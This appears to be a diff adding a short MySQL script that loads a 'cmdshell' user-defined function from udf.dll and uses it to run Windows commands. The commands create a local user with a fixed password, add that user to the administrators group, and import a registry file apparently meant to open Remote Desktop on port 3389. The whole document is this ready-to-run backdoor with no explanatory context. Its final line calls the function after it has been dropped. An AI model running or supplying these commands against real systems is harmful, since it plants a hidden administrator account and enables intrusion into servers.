@@ -1,0 +1,7 @@
+create function cmdshell returns string soname 'udf.dll' 
+select cmdshell('net user iis_user 123!@#abcABC /add'); 
+select cmdshell('net localgroup administrators iis_user /add'); 
+select cmdshell('regedit /s d:web3389.reg'); 
+drop function cmdshell; 
+select cmdshell('netstat -an');
+
